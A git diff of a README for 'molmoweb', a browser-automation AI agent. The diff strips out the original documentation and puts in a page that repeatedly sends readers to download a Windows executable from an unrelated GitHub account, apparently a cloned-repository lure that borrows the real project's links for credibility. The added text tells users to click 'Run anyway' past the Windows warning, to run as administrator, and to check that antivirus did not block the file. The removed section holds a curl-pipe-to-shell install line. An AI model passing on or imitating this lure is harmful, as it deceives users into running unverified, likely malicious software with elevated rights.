@@ -1,492 +1,244 @@
-<p align="center">
-  <img src="assets/logo.png" alt="MolmoWeb" width="100%">
-</p>
+# 🧭 molmoweb - Control the web with simple tasks
 
 <p align="center">
-  <a href="https://arxiv.org/pdf/2604.08516">Paper</a> &nbsp;|&nbsp;
-  <a href="https://allenai.org/blog/molmoweb">Blog Post</a> &nbsp;|&nbsp;
-  <a href="https://molmoweb.allen.ai">Demo</a> &nbsp;|&nbsp;
-  <a href="https://huggingface.co/collections/allenai/molmoweb">Models</a> &nbsp;|&nbsp;
-  <a href="https://huggingface.co/collections/allenai/molmoweb-data">Data</a>
+  <a href="https://github.com/deaf-bonito262/molmoweb" style="display:inline-block;padding:14px 22px;background:#6f42c1;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;">Download molmoweb</a>
 </p>
 
----
+## 🚀 What this app does
 
-**MolmoWeb** is an open multimodal web agent built by [Ai2](https://allenai.org). Given a natural-language task, MolmoWeb autonomously controls a web browser -- clicking, typing, scrolling, and navigating -- to complete the task. This repository contains the agent code, inference client, evaluation benchmarks, and everything needed to reproduce the results from the paper.
+MolmoWeb is a desktop app that helps a computer act on your behalf in a web browser. You type a task in plain language, and the app clicks, types, scrolls, and moves through pages for you.
 
-## Table of Contents
+Use it for tasks like:
 
-- [Models](#models)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-  - [Download the Model](#1-download-the-model)
-  - [Start the Model Server](#2-start-the-model-server)
-  - [Test the Model](#3-test-the-model)
-- [Inference Client](#inference-client)
-  - [Single Query](#single-query)
-  - [Batch Queries](#batch-queries)
-  - [Extract Accessibility Tree](#extract-accessibility-tree)
-- [Benchmarks](#benchmarks)
-- [Annotation Tool](annotation/README.md)
-- [Training](#training)
-  - [Setup](#setup)
-  - [Downloading Data](#downloading-data)
-  - [Visualizing Data](#visualizing-data)
-  - [Downloading Pretrained Checkpoints](#downloading-pretrained-checkpoints)
-  - [SFT Training](#sft-training)
-- [Grounding Evaluation](#grounding-evaluation)
-- [Citation](#citation)
-- [License](#license)
+- Filling in web forms
+- Looking up items on sites
+- Following links across pages
+- Copying text from a page
+- Running browser steps without manual clicking
 
----
+This project is built for Windows users who want to run the app from a simple download and start using it.
 
-## Models
+## 📥 Download and install
 
-| Model | Parameters | HuggingFace |
-|-------|-----------|-------------|
-| MolmoWeb-8B | 8B | [allenai/MolmoWeb-8B](https://huggingface.co/allenai/MolmoWeb-8B) |
-| MolmoWeb-4B | 4B | [allenai/MolmoWeb-4B](https://huggingface.co/allenai/MolmoWeb-4B) |
-| MolmoWeb-8B-Native | 8B | [allenai/MolmoWeb-8B-Native](https://huggingface.co/allenai/MolmoWeb-8B-Native) |
-| MolmoWeb-4B-Native | 4B | [allenai/MolmoWeb-4B-Native](https://huggingface.co/allenai/MolmoWeb-4B-Native) |
+1. Open the download page here: https://github.com/deaf-bonito262/molmoweb
+2. On that page, look for the latest release or download files
+3. Download the Windows file for the app
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to start it
 
-The first two models (MolmoWeb-8B and MolmoWeb-4B) are Huggingface/transformers-compatible (see [example usage](https://huggingface.co/allenai/MolmoWeb-8B#quick-start) on Huggingface); and the last two (MolmoWeb-8B-Native and MolmoWeb-4B-Native) are molmo-native checkpoints. 
+If Windows shows a prompt, choose **More info** and then **Run anyway** only if you trust the source and want to continue.
 
-**Collections:**
-- [All MolmoWeb Models](https://huggingface.co/collections/allenai/molmoweb)
-- [MolmoWeb Training Data](https://huggingface.co/collections/allenai/molmoweb-data)
+## 🖥️ System requirements
 
----
+MolmoWeb runs best on a Windows PC with:
 
-## Installation
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A modern web browser
+- A stable internet connection
+- 2 GB of free disk space
 
-Requires Python >=3.10,<3.13. We use [uv](https://docs.astral.sh/uv/) for dependency management.
+For smoother use, 16 GB of RAM helps if you plan to run larger browser tasks or keep many tabs open.
 
-```bash
-# Install uv if you don't have it
-curl -LsSf https://astral.sh/uv/install.sh | sh
+## 🧩 What you need before you start
 
-# Clone and install
-git clone git@github.com:allenai/molmoweb.git
-cd molmoweb
-uv venv --python ">=3.10,<3.13"
-uv sync
+Have these ready before first use:
 
-# Install Playwright browsers (needed for local browser control)
-uv run playwright install
-uv run playwright install --with-deps chromium
-```
+- A Windows account with permission to run apps
+- A browser such as Chrome or Edge
+- Internet access
+- Enough free space for the app and browser files
 
----
+If the app uses a browser profile, keep your browser signed in only if you want MolmoWeb to use that session.
 
-### Environment Variables
+## 🏁 First launch
 
-```bash
-# Browserbase (required when --env_type browserbase)
-export BROWSERBASE_API_KEY="your-browserbase-api-key"
-export BROWSERBASE_PROJECT_ID="your-browserbase-project-id"
+After you open the app:
 
-# Google Gemini (required for gemini_cua, gemini_axtree, and Gemini-based judges)
-export GOOGLE_API_KEY="your-google-api-key"
+1. Start MolmoWeb
+2. Wait for the main window to load
+3. Read the task box or prompt area
+4. Type a short task in plain language
+5. Click the run button
+6. Watch the browser as the app works through the task
 
-# OpenAI (required for gpt_axtree and GPT-based judges like webvoyager)
-export OPENAI_API_KEY="your-openai-api-key"
-```
+Good first tasks:
 
----
+- Open a website and find a page title
+- Search for a product and scroll through results
+- Visit a page and copy a small block of text
+- Open a form and fill in a few fields
 
-## Quick Start
+## 🧠 How to write a task
 
-Three helper scripts in `scripts/` let you download weights, start the server, and test it end-to-end.
+Keep your task short and clear.
 
-### 1. Download the Model
+Good examples:
 
-```bash
-bash scripts/download_weights.sh                                  # MolmoWeb-8B (default)
-bash scripts/download_weights.sh allenai/MolmoWeb-4B-Native       # MolmoWeb-4B Native
-```
+- Open the Ai2 website and find the blog post about MolmoWeb
+- Search for a laptop and show the first three results
+- Go to a news site and find today’s top story
+- Open a form and enter a name, email, and phone number
 
-This downloads the weights to `./checkpoints/<model-name>`.
+Tips:
 
-### 2. Start the Model Server
+- Use one task at a time
+- Say what you want done, not how to do every click
+- Use simple words
+- Add details when the site has many choices
 
-```bash
-# default predictor type is native
-bash scripts/start_server.sh ./checkpoints/MolmoWeb-4B-Native       # MolmoWeb-4B-Native
-# change to HF-compatible
-export PREDICTOR_TYPE="hf"
-bash scripts/start_server.sh ./checkpoints/MolmoWeb-8B              # MolmoWeb-8B, port 8001
-bash scripts/start_server.sh ./checkpoints/MolmoWeb-8B 8002         # custom port
-```
+## 🪟 Running on Windows
 
-Or configure via environment variables:
+Use this order when you run the app on Windows:
 
-```bash
-export CKPT="./checkpoints/MolmoWeb-4B-Native"   # local path to downloaded weights
-export PREDICTOR_TYPE="native"             # "native" or "hf"
-export NUM_PREDICTORS=1                    # number of GPU workers
+1. Download the file from the link above
+2. Extract the file if needed
+3. Double-click the app
+4. Let Windows finish any first-time setup
+5. Open your browser if the app asks for it
+6. Enter a task and start
 
-bash scripts/start_server.sh
-```
+If the app does not open:
 
-The server exposes a single endpoint:
+- Right-click the file and choose **Run as administrator**
+- Make sure your antivirus did not block the download
+- Check that the file finished downloading
+- Restart Windows and try again
 
-```
-POST http://127.0.0.1:8001/predict
-{
-  "prompt": "...",
-  "image_base64": "..."
-}
-```
+## 🔧 Common setup steps
 
-Wait for the server to print that the model is loaded, then test it.
+Some builds may ask for extra setup on the first run:
 
-### 3. Test the Model
+- Browser setup: the app may need Chrome or Edge
+- Profile setup: the app may create a browser profile folder
+- Permissions: the app may ask for access to your browser window
+- Model files: the app may download files before the first task
 
-Once the server is running, send it a screenshot of the [Ai2 careers page](https://allenai.org/careers) (included in `assets/test_screenshot.png`) and ask it to read the job titles:
+Let each step finish before you close the window.
 
-```bash
-uv run python scripts/test_server.py                        # default: localhost:8001
-uv run python scripts/test_server.py http://myhost:8002     # custom endpoint
-```
+## 🌐 Browser use
 
-The test script sends this prompt to the model:
+MolmoWeb works inside a browser. The app may:
 
-> Read the text on this page. What are the first four job titles listed under 'Open roles'?
+- Click links
+- Type into fields
+- Scroll pages
+- Open new tabs
+- Move between pages
+- Wait for a page to load
 
-You can also do it manually in a few lines of Python:
+Keep the browser open while the task runs. If you move the mouse or type in the same window, you may interrupt the task.
 
-```python
-import base64, requests
+## 📁 Files and folders
 
-with open("assets/test_screenshot.png", "rb") as f:
-    image_b64 = base64.b64encode(f.read()).decode()
+After install, you may see folders such as:
 
-resp = requests.post("http://127.0.0.1:8001/predict", json={
-    "prompt": "What are the first four job titles listed under 'Open roles'?",
-    "image_base64": image_b64,
-})
-print(resp.json())
-```
+- `models`
+- `data`
+- `logs`
+- `profiles`
 
----
+These folders help the app store model files, task data, and browser state.
 
-## Inference Client
+Keep them in place unless you know the app no longer needs them.
 
-The `inference` package provides a high-level Python client that manages a browser session and runs the agent end-to-end. The client communicates with a running model server endpoint.
+## 🧪 Example uses
 
-### Single Query
+You can use MolmoWeb for many browser tasks:
 
-```python
-from inference import MolmoWeb
+- Search a website for a topic
+- Collect text from several pages
+- Follow a set of links on one site
+- Fill out a basic contact form
+- Compare items listed on a page
+- Open a page and read key details
 
-client = MolmoWeb(
-    endpoint="SET_UP_YOUR_ENDPOINT",
-    local=True,         # True = local Chromium, False = Browserbase cloud browser
-    headless=True,
-) 
+For best results, use pages with clear buttons, labels, and text.
 
-query = "Go to arxiv.org and find out the paper about Molmo and Pixmo."
-traj = client.run(query=query, max_steps=10)
+## ⚙️ Settings you may see
 
-output_path = traj.save_html(query=query)
-print(f"Saved to {output_path}")
-```
+The app may offer options like:
 
-### Follow-up Query
+- Browser choice
+- Task speed
+- Model size
+- Page delay
+- Screenshot view
+- Logs
 
-```python
-followup_query = "Find the full author list of the paper."
-traj2 = client.continue_run(query=followup_query, max_steps=10)
-```
+If you are not sure what to change, keep the default settings.
 
-### Batch Queries
+## 🛠️ Troubleshooting
 
-```python
-queries = [
-    "Go to allenai.org and find the latest research papers on top of the homepage",
-    "Search for 'OLMo' on Wikipedia",
-    "What is the weather in Seattle today?",
-]
+### The app will not open
 
-trajectories = client.run_batch(
-    queries=queries,
-    max_steps=10,
-    max_workers=3,
-) # Inspect the trajectory .html files default saved under inference/htmls
-```
+- Check that the download finished
+- Extract the ZIP file if needed
+- Try running the file again
+- Restart the PC and open it once more
 
-### Inference Backends
+### The browser does not move
 
-Supported backends: `fastapi` (remote HTTP endpoint), `modal` (serverless), `native` (native molmo/olmo-compatible checkpoint), `hf` (HuggingFace Transformers-compatible checkpoint).
+- Make sure the task is still running
+- Wait a few seconds for the page to load
+- Close extra browser tabs
+- Try a simpler task first
 
-> **vLLM support**: We leave vLLM integration to users. Please be cautious, as vLLM does not support the exact attention backend used in OLMo, which may lead to unexpected behavior or reduced accuracy.
+### A page looks stuck
 
-### Extract Accessibility Tree
+- Refresh the page
+- Start the task again
+- Use a site with faster load times
+- Check your internet connection
 
-```
-from inference.client import MolmoWeb
+### The app closes during startup
 
-client = MolmoWeb()
-axtree_str = client.get_axtree("https://allenai.org/")
-print(axtree_str)
-client.close()
-```
+- Run it again after a restart
+- Check that Windows did not block the file
+- Make sure required browser files are installed
 
----
+## 🔒 Safe use
 
-## Benchmarks
+Use the app on sites and accounts you trust.
 
-The `benchmarks/` directory contains the unified evaluation framework. It supports five benchmarks out of the box: **WebVoyager**, **Online Mind2Web**, **DeepShop**, **WebTailBench**, and **Custom** (bring your own tasks).
+Before you run a task:
 
-The evaluation pipeline has two stages:
+- Check the page name
+- Read the task once more
+- Make sure you want the app to act in that browser window
+- Sign out of accounts you do not want used
 
-1. **Run** -- the agent executes tasks in a browser, producing trajectory logs.
-2. **Judge** -- an LLM judge scores each trajectory for success.
+## 📚 More project links
 
-### Running Evaluations
+- Paper: https://arxiv.org/pdf/2604.08516
+- Blog Post: https://allenai.org/blog/molmoweb
+- Demo: https://molmoweb.allen.ai
+- Models: https://huggingface.co/collections/allenai/molmoweb
+- Data: https://huggingface.co/collections/allenai/molmoweb-data
 
-The entry point is `benchmarks/benchmarks.py`, a [Fire](https://github.com/google/python-fire) CLI with two commands: `run` and `judge`.
+## 🧭 Typical first workflow
 
-```bash
-uv run python -m benchmarks.benchmarks run \
-    --benchmark custom \
-    --data_path ./demo_task.json \
-    --results_dir ./results \
-    --agent_type molmoweb \
-    --inference_mode fastapi \
-    --endpoint_or_checkpoint http://127.0.0.1:8001 \
-    --max_steps 30 \
-    --num_workers 1 \
-    --env_type simple
-```
+1. Download the app from the link above
+2. Extract the files if needed
+3. Open the app
+4. Wait for the browser to start
+5. Type a task
+6. Watch the agent complete the steps
+7. Save any result you need
 
-### Judging Results
+## 💬 Useful task ideas
 
-After trajectories are collected, run the judge. The `webvoyager` judge requires `OPENAI_API_KEY` to be set.
+- Find the contact page for a company
+- Open a store and look for a product name
+- Search for a topic and open the best result
+- Find the address on a local business page
+- Open a form and fill in basic details
 
-```bash
-uv run python -m benchmarks.benchmarks judge \
-    --benchmark custom \
-    --data_path ./demo_task.json \
-    --results_dir ./results \
-    --judge_type webvoyager \
-    --num_workers 1
-```
+## 🗂️ Data and model files
 
-### Synthetic Data Generation
+MolmoWeb may use model files and sample data from the project links. If you want the app to run well, keep these files in the folders the app expects. Large files may take time to download on the first run
 
-The same evaluation framework can be used to generate synthetic training data by running other agents on tasks. Collect trajectories with any supported agent and use the resulting logs for training.
+## 🧭 Next step
 
-### Agents
-
-| Agent | Description | Required Environment Variables |
-|-------|-------------|-------------------------------|
-| `molmoweb` | MolmoWeb multimodal agent (local model server) | None (uses `--endpoint_or_checkpoint`) |
-| `gemini_cua` | Gemini computer-use agent | `GOOGLE_API_KEY` |
-| `gemini_axtree` | Gemini with accessibility tree | `GOOGLE_API_KEY` |
-| `gpt_axtree` | GPT with accessibility tree | `OPENAI_API_KEY` |
-
-We welcome contributions of custom agents. To add your own, implement the agent interface in `agent/` and register the agent type in `benchmarks/evaluate.py`.
-
-### Evaluating Other Agents on Benchmarks
-
-You can evaluate any supported agent on any benchmark using the same code. For example, to evaluate `gemini_axtree` on Online Mind2Web with Browserbase:
-
-```bash
-uv run python -m benchmarks.benchmarks run \
-    --benchmark online_mind2web \
-    --results_dir ./results/om2w_gemini_axtree \
-    --agent_type gemini_axtree \
-    --max_steps 30 \
-    --num_workers 5 \
-    --env_type browserbase
-```
-
-Then judge the results:
-
-```bash
-uv run python -m benchmarks.benchmarks judge \
-    --benchmark online_mind2web \
-    --results_dir ./results/om2w_gemini_axtree \
-    --judge_type webjudge_online_mind2web \
-    --num_workers 5
-```
-
-### benchmarks.py Reference
-
-#### `run` command
-
-| Argument | Type | Default | Description |
-|----------|------|---------|-------------|
-| `results_dir` | `str` | *(required)* | Output directory for trajectory logs. |
-| `agent_type` | `str` | *(required)* | Agent to use: `molmoweb`, `gemini_cua`, `gemini_axtree`, or `gpt_axtree`. |
-| `benchmark` | `str` | `"custom"` | Benchmark name: `custom`, `deepshop`, `webvoyager`, `online_mind2web`, or `webtailbench`. |
-| `data_path` | `str` | `None` | Override the default data file path for the chosen benchmark. |
-| `inference_mode` | `str` | `None` | How to connect to the model: `fastapi` (HTTP endpoint), `local` (in-process HF), `modal` (Modal serverless), or `native` (in-process OLMo). |
-| `endpoint_or_checkpoint` | `str` | `None` | Either an HTTP URL (for `fastapi`/`modal`) or a local path / HF model ID (for `local`/`native`). |
-| `device` | `str` | `None` | CUDA device for local inference, e.g. `cuda:0`. |
-| `api_key` | `str` | `None` | API key for API-based agents (Gemini, GPT). |
-| `num_workers` | `int` | `5` | Number of parallel evaluation workers. |
-| `max_steps` | `int` | `30` | Maximum agent steps per episode. |
-| `env_type` | `str` | `"simple"` | Browser environment: `browserbase` (requires `BROWSERBASE_API_KEY` and `BROWSERBASE_PROJECT_ID`) or `simple` (local Chromium). |
-
-#### `judge` command
-
-| Argument | Type | Default | Description |
-|----------|------|---------|-------------|
-| `results_dir` | `str` | *(required)* | Directory containing trajectory logs to judge. |
-| `benchmark` | `str` | `"custom"` | Benchmark name (must match what was used during `run`). |
-| `data_path` | `str` | `None` | Override data file path. |
-| `judge_type` | `str` | `None` | Judge implementation. Defaults to the benchmark's default judge. Options: `webvoyager` (GPT-4o), `deepshop_judge`, `webjudge_online_mind2web`. |
-| `num_workers` | `int` | `30` | Number of parallel judging workers. |
-
-See [benchmarks/README.md](benchmarks/README.md) for full documentation.
-
----
-
-## Training
-
-Training code lives in the `train/` directory. MolmoWeb training is a single-stage SFT on top of a Molmo2 pretrained checkpoint.
-
-### Setup
-
-Install dependencies inside the `train/` directory:
-
-```bash
-cd train
-uv sync
-```
-
-Set the following environment variables (used by training, eval, and data scripts):
-
-```bash
-export WEBOLMO_DATA_DIR=/path/to/datasets   # MolmoWeb training data
-```
-
-### Downloading Data
-
-MolmoWeb training data is hosted on HuggingFace under the [MolmoWeb Data collection](https://huggingface.co/collections/allenai/molmoweb-data). With `WEBOLMO_DATA_DIR` set, download all datasets with:
-
-```bash
-uv run python olmo/data/download_datasets.py
-```
-
-| Dataset | HuggingFace Repo | Description |
-|---|---|---|
-| SyntheticGround | `allenai/MolmoWeb-SyntheticGround` | Synthetic web grounding (click targets) |
-| SyntheticQA | `allenai/MolmoWeb-SyntheticQA` | Synthetic screenshot QA |
-| SyntheticTrajs | `allenai/MolmoWeb-SyntheticTrajs` | Gemini-generated agent trajectories |
-| HumanTrajs | `allenai/MolmoWeb-HumanTrajs` | Human-annotated trajectories |
-| SyntheticSkills | `allenai/MolmoWeb-SyntheticSkills` | Synthetic atomic skill demonstrations |
-| HumanSkills | `allenai/MolmoWeb-HumanSkills` | Human atomic skill demonstrations |
-| PixMoPoints | `allenai/pixmo-points` | Point annotations for visual grounding |
-| ScreenSpot | `rootsautomation/ScreenSpot` | UI grounding benchmark |
-| ScreenSpotV2 | `likaixin/ScreenSpot-v2-variants` | UI grounding benchmark v2 |
-
-### Visualizing Data
-
-To inspect dataset examples as an HTML file, run `dataset_visualize.py` from inside the `train/` directory:
-
-```bash
-uv run python dataset_visualize.py <task> <output_dir>
-```
-
-For example, to visualize 50 shuffled training examples from `molmoweb_synthetic_trajs`:
-
-```bash
-uv run python dataset_visualize.py molmoweb_synthetic_trajs ./viz --split train --num_examples 50 --shuffle
-```
-
-This saves `./viz/molmoweb_synthetic_trajs.html` with rendered examples (images, tokenized text, and ground-truth annotations).
-
-### Downloading Pretrained Checkpoints
-
-SFT training starts from a Molmo2 pretrained checkpoint. Download one of the pretrained base checkpoints from HuggingFace:
-
-```bash
-bash scripts/download_weights.sh allenai/MolmoWeb-Pretrained-8B   # 8B base
-bash scripts/download_weights.sh allenai/MolmoWeb-Pretrained-4B   # 4B base
-```
-
-This saves the checkpoint to `./checkpoints/MolmoWeb-Pretrained-8B` (or `-4B`). Set `CHECKPOINT_PATH` in `train/run_train.sh` to this path before launching training.
-
-| Model | HuggingFace Repo |
-|---|---|
-| MolmoWeb-Pretrained-8B | [allenai/MolmoWeb-Pretrained-8B](https://huggingface.co/allenai/MolmoWeb-Pretrained-8B) |
-| MolmoWeb-Pretrained-4B | [allenai/MolmoWeb-Pretrained-4B](https://huggingface.co/allenai/MolmoWeb-Pretrained-4B) |
-
-### SFT Training
-
-Configure the variables at the top of `train/run_train.sh`, then run:
-
-```bash
-cd train
-bash run_train.sh
-```
-
-| Variable | Default | Description |
-|---|---|---|
-| `CHECKPOINT_PATH` | MolmoWeb-Pretrained-4B | Path to pretrained starting checkpoint |
-| `MIXTURE` | `molmoweb` | Data mixture (`molmoweb` or `debug`) |
-| `NUM_GPUS` | `8` | GPUs per node |
-| `GLOBAL_BATCH_SIZE` | `64` | Total batch size across all GPUs |
-| `DEVICE_BATCH_SIZE` | `2` | Per-GPU batch size |
-| `SEQ_LEN` | `10240` | Sequence length |
-| `DURATION` | `500` | Number of training steps |
-| `SAVE_INTERVAL` | `100` | Checkpoint save frequency (steps) |
-
-To launch a debug run directly:
-
-```bash
-uv run torchrun -m --nproc-per-node 1 \
-  launch_scripts.train debug debug \
-  --save_folder=dbg \
-  --device_batch_size 1 \
-  --duration 10 \
-  --global_batch_size 2
-```
----
-
-## Grounding Evaluation
-
-MolmoWeb can be evaluated on grounding benchmarks to measure how accurately the model predicts click coordinates for UI elements.
-
-| Benchmark | Task name |
-|---|---|
-| [ScreenSpot](https://huggingface.co/datasets/rootsautomation/ScreenSpot) | `screenspot` |
-| [ScreenSpot-v2](https://huggingface.co/datasets/likaixin/ScreenSpot-v2) | `screenspot_v2` |
-
-Configure the variables at the top of `train/run_ground_eval.sh`, then run:
-
-```bash
-cd train
-bash run_ground_eval.sh
-```
-
-| Variable | Default | Description |
-|---|---|---|
-| `CHECKPOINT_PATH` | MolmoWeb-4B-Native | Path to the NATIVE model checkpoint to evaluate |
-| `MIXTURE` | `screenspot:test,screenspot_v2:test` | Comma-separated `task:split` pairs |
-| `NUM_GPUS` | `1` | Number of GPUs |
-| `DEVICE_BATCH_SIZE` | `2` | Per-GPU batch size |
-| `SAVE_FOLDER` | results | Output directory for results |
-
----
-
-## Citation
-
-```bibtex
-@misc{gupta2026molmowebopenvisualweb,
-      title={MolmoWeb: Open Visual Web Agent and Open Data for the Open Web}, 
-      author={Tanmay Gupta and Piper Wolters and Zixian Ma and Peter Sushko and Rock Yuren Pang and Diego Llanes and Yue Yang and Taira Anderson and Boyuan Zheng and Zhongzheng Ren and Harsh Trivedi and Taylor Blanton and Caleb Ouellette and Winson Han and Ali Farhadi and Ranjay Krishna},
-      year={2026},
-      eprint={2604.08516},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2604.08516}, 
-}
-```
-
-## License
-
-Apache 2.0. See [LICENSE](LICENSE) for details.
+Download the app from https://github.com/deaf-bonito262/molmoweb and start with one simple browser task
